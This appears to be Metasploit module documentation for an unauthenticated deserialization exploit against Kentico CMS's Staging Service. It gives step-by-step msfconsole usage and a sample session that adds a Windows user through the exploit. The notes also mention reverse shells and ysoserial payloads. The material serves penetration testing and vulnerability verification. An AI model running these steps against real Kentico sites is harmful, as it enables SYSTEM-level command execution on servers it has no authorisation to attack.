## Vulnerable Application

[Kentico CMS](www.kentico.com) CMS platform versions 12.0.14 and earlier are affected by an unauthenticated deserialization vulnerability in the Staging Service which can be leveraged by an attacker to execute arbitrary commands in the context of NT AUTHORITY\SYSTEM on the target. The vulnerability is triggered by sending a HTTP POST request to the SyncServer.asmx interface ProcessSynchronizationTaskData method stagingTaskData parameter request path in HTTP GET requests sent to the built-in web server. This module has been tested successfully on Windows 10 using exec and adduser payloads against Kentico v11. The vulnerable application is available for download at https://d82ujmuzqhypi.cloudfront.net/Kentico_11_0_trial.exe, https://d82ujmuzqhypi.cloudfront.net/Kentico_12_0_trial.exe, https://www.kentico.com/download-demo

## Verification Steps
  1. Install a vulnerable Kentico CMS Trial version.
  2. Access web instance admin interface at /admin/
  3. Default credentials are 'administrator' with blank password.
  4. Navigate to `Settings`, then expand `Settings` > `Versioning & Synchronization` > `Staging`
  5. Check `Enable Staging Service` and click `Save`
  6. Start `msfconsole`
  7. Do `use exploit/windows/http/kentico_staging_syncserver`
  8. Do `set RHOSTS ip` (Trial is limited to 127.0.0.1 remote HTTP clients, but paid versions are public websites)
  9. Do `set RPORT port` (installs with a random port within IISExpress for at least Trial versions)
  10. Do `check`
  11. Verify the target is detected
  12. Do `set PAYLOAD cmd/windows/generic`
  13. Do `set CMD calc`
  14. Do `exploit`
  15. Verify `calc.exe` launches. 

## Scenarios

### Kentico CMS v11.0 trial on Windows 10

```
msf5 > use exploit/windows/http/kentico_staging_syncserver
msf5 exploit(windows/http/kentico_staging_syncserver) > show options

Module options (exploit/windows/http/kentico_staging_syncserver):

   Name       Current Setting                    Required  Description
   ----       ---------------                    --------  -----------
   Proxies                                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80                                 yes       The target port (TCP)
   SSL        false                              no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /CMSPages/Staging/SyncServer.asmx  yes       Path to SyncServer.asmx
   VHOST                                         no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(windows/http/kentico_staging_syncserver) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf5 exploit(windows/http/kentico_staging_syncserver) > set RPORT 62925
RPORT => 62925
msf5 exploit(windows/http/kentico_staging_syncserver) > check
[*] 127.0.0.1:62925 - The service is running, but could not be validated.
msf5 exploit(windows/http/kentico_staging_syncserver) > set PAYLOAD cmd/windows/adduser
PAYLOAD => cmd/windows/adduser
msf5 exploit(windows/http/kentico_staging_syncserver) > exploit

[+] 127.0.0.1:62925 - Payload success!
[*] Exploit completed, but no session was created.
```

```
Microsoft Windows [Version 10.0.18363.720]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>net users

User accounts for \\WIN10

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
metasploit
The command completed successfully.


C:\Windows\system32>net user metasploit /del
The command completed successfully.
```

## Notes

  1. The IISExpress config is located in ~/Documents/IISExpress/config/applicationhost.config
  2. Port number can be changed or allow remote access by replacing 'localhost' with '*'
  3. To run IIS on command line, C:\PROGRA~1\IIS Express\iisexpress.exe /site:Kentico11 (etc)
  4. It might be possible to use a CmdStager or FileDropper but couldn't get it working in time. Might be a string limit and has issues with Unicode.
  5. Some reverse or bind payloads work if the environment is right.
  6. Other serialized injections are possible with `ysoserial.exe -f SoapFormatter` but untested.
